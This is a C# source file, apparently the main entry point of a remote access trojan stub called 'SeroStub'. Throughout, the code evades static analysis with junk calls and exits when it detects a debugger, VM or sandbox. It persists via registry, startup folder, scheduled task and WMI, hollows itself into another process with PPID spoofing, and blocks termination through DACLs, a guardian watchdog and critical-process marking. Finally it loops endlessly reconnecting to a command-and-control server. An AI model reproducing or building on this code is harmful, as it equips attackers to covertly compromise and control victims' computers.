using System.Diagnostics;
using System.Runtime.InteropServices;

namespace SeroStub;

partial class Program
{
    private static Mutex? _mutex;

    public static void ReleaseMutex()
    {
        try { _mutex?.ReleaseMutex(); } catch { }
        _mutex?.Dispose();
        _mutex = null;
    }

    private static void ProtectionExit(string check)
    {
        StubLog.Info($"{check} triggered, exiting.");
    }

    [System.Diagnostics.Conditional("DEBUG")]
    private static void Breadcrumb(string msg)
    {
        StubLog.Info($"[Breadcrumb] {msg}");
    }

    private static bool IsAdmin()
    {
        try
        {
            using var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            return new System.Security.Principal.WindowsPrincipal(identity)
                .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch { return false; }
    }

    internal static void ReacquireMutex()
    {
        if (!Config.UseMutex) return;

        try
        {
            _mutex = new Mutex(true, Config.MutexName, out bool created);
            if (!created)
            {
                _mutex.WaitOne(3000);
            }
        }
        catch { }
    }

    [LibraryImport("kernel32.dll")]
    private static partial uint SetErrorMode(uint uMode);

    [LibraryImport("kernel32.dll")]
    private static partial uint GetACP();
    [LibraryImport("kernel32.dll", StringMarshalling = StringMarshalling.Utf16)]
    private static partial int GetLocaleInfoW(uint Locale, uint LCType, nint lpLCData, int cchData);
    [LibraryImport("kernel32.dll")]
    private static partial nint GetStdHandle(int nStdHandle);
    [LibraryImport("kernel32.dll", StringMarshalling = StringMarshalling.Utf16)]
    private static partial uint GetModuleFileNameW(nint hModule, nint lpFilename, uint nSize);
    [LibraryImport("user32.dll")]
    private static partial int GetSystemMetrics(int nIndex);
    [LibraryImport("kernel32.dll")]
    private static partial ulong GetTickCount64();

    // Junk initialization — looks like normal app startup to static analysis
    private static void _InitRuntime()
    {
        _ = GetACP();
        _ = GetLocaleInfoW(0x0409, 0x59, nint.Zero, 0);
        _ = GetStdHandle(-10);
        _ = GetSystemMetrics(0);
        _ = GetSystemMetrics(1);
        _ = GetTickCount64();
        unsafe { var buf = stackalloc char[260]; GetModuleFileNameW(nint.Zero, (nint)buf, 260); }
    }

    [STAThread]
    static async Task Main()
    {
        // Suppress crash/WER dialogs — prevents "buffer overrun" popup when DACL blocks external kill
        SetErrorMode(0x0001 | 0x0002 | 0x8000);
        _InitRuntime();

        // Guardian check: if launched as guardian, monitor parent and exit
        if (Protection.RunAsGuardianIfNeeded()) return;

        // Clear any leftover stop flag from a previous uninstall so that
        // a freshly-launched stub is not immediately blocked by guardians.
        Protection.ClearStopFlag();

        // Single instance (if mutex is enabled)
        if (Config.UseMutex)
        {
            _mutex = new Mutex(true, Config.MutexName, out bool created);
            if (!created) { Breadcrumb("EXIT: mutex already held"); return; }
        }

        // Apply DACL immediately — before any delay or check — so the process is
        // protected from TerminateProcess() during the entire startup window.
        // Without this, a re-launched process can be killed in the 2-4s gap
        // between relaunch and the watchdog setup at the end of Main().
        if (Config.EnableWatchdog && !ProcessHollowing.IsHollowedInstance())
            Protection.ProtectProcessDacl();

        bool admin = IsAdmin();
        Breadcrumb($"START admin={admin} path={Environment.ProcessPath}");

        // Anti-Protection checks FIRST (before any process manipulation)
        if (!ProcessHollowing.IsHollowedInstance())
        {
            // Anti-sandbox: short sleep to bypass fast-forward detection
            await Task.Delay(1500);

            if (Config.AntiDebug && Protection.IsDebuggerDetected()) { ProtectionExit("AntiDebug"); return; }
            if (Config.AntiVM && Protection.IsVirtualMachine()) { ProtectionExit("AntiVM"); return; }
            if (Config.AntiDetect && Protection.IsAnalysisEnvironment()) { ProtectionExit("AntiDetect"); return; }
            if (Config.AntiSandbox && Protection.IsSandbox()) { ProtectionExit("AntiSandbox"); return; }
        }

        // Persistence BEFORE hollowing (so Environment.ProcessPath = original exe)
        if (!ProcessHollowing.IsHollowedInstance())
        {
            bool hasPersist = Config.PersistRegistry || Config.PersistStartup || Config.PersistTask;
            if (hasPersist)
            {
                // Copy exe to a permanent location (AppData) so persistence survives
                // Pass isAdmin so we don't relaunch when elevated (would lose admin token)
                var installPath = Persistence.EnsureInstalled(Config.PersistName, admin, allowMultiInstance: !Config.UseMutex);
                if (installPath != null && Config.UseMutex)
                {
                    // We were copied to AppData and relaunched from there — exit this instance
                    // (only if mutex is enabled; multi-instance mode continues with both instances)
                    Breadcrumb($"EXIT: relaunching from {installPath}");
                    ReleaseMutex();
                    return;
                }
                // installPath == null means we're already running from the install dir (or admin mode)
                if (Config.PersistRegistry) Persistence.InstallRegistry(Config.PersistName);
                if (Config.PersistStartup) Persistence.InstallStartup(Config.PersistName);
                if (Config.PersistTask) Persistence.InstallScheduledTask(Config.PersistName);
            }
        }

        // Store real exe path before hollowing so the guardian can find it
        if (Config.EnableWatchdog && !ProcessHollowing.IsHollowedInstance())
        {
            var realPath = Environment.ProcessPath;
            if (!string.IsNullOrEmpty(realPath))
                Environment.SetEnvironmentVariable("SERO_EXE", realPath);
        }

        // Process hollowing: if enabled and we're NOT the hollowed instance, hollow and exit
        // Skip PPID spoofing when admin to preserve elevation token
        if (Config.EnableHollowing && !ProcessHollowing.IsHollowedInstance())
        {
            StubLog.Info($"Hollowing self into {Config.HollowTarget}...");

            // Release mutex BEFORE hollowing so the child process can acquire it
            ReleaseMutex();

            int pid = ProcessHollowing.HollowSelf(Config.HollowTarget, skipPpidSpoof: admin);
            if (pid > 0)
            {
                Breadcrumb($"Hollowed OK PID={pid}, exiting parent.");
                return;
            }

            // Hollowing failed — reacquire mutex and continue as normal
            Breadcrumb("Hollowing failed, continuing.");
            ReacquireMutex();
            StubLog.Error("Hollowing failed, continuing as normal process.");
        }


        // Hide thread from debugger (only if AntiDebug is enabled)
        if (Config.AntiDebug)
            Protection.HideFromDebugger();

        // Anti-Kill: mark as critical process (BSOD if killed, requires admin)
        if (Config.AntiKill && admin)
            Protection.SetCriticalProcess();

        // Watchdog: DACL + guardian process + startup surveillance
        // Works with or without hollowing — guardian finds exe via installed path or original ProcessPath
        if (Config.EnableWatchdog)
        {
            Protection.ProtectProcessDacl();
            Protection.StartAntiKillWatchdog();
            bool hasPersist2 = Config.PersistRegistry || Config.PersistStartup || Config.PersistTask;
            if (hasPersist2)
            {
                Persistence.StartWatchdog(Config.PersistName);
                var wmiExePath = Persistence.GetInstalledPath(Config.PersistName) ?? Environment.ProcessPath;
                if (!string.IsNullOrEmpty(wmiExePath))
                    Protection.RegisterWmiPersistence(wmiExePath);
            }
        }

        Breadcrumb($"CONNECTING to {Config.Host}:{Config.Port}");
        // Auto-reconnect loop
        while (true)
        {
            try
            {
                StubLog.Info($"Connecting to {Config.Host}:{Config.Port}...");
                using var client = new TlsClient(Config.Host, Config.Port);
                await client.RunAsync(CancellationToken.None);

                // Server sent Disconnect or Uninstall — stop reconnecting
                if (!client.ShouldReconnect)
                {
                    StubLog.Info("Server requested stop, exiting.");
                    return;
                }

                StubLog.Info("Connection lost, will reconnect...");
            }
            catch (Exception ex)
            {
                StubLog.Error($"Connection error: {ex.GetType().Name}: {ex.Message}");
            }

            // Wait before reconnecting
            await Task.Delay(Config.ReconnectDelayMs);
        }
    }
}
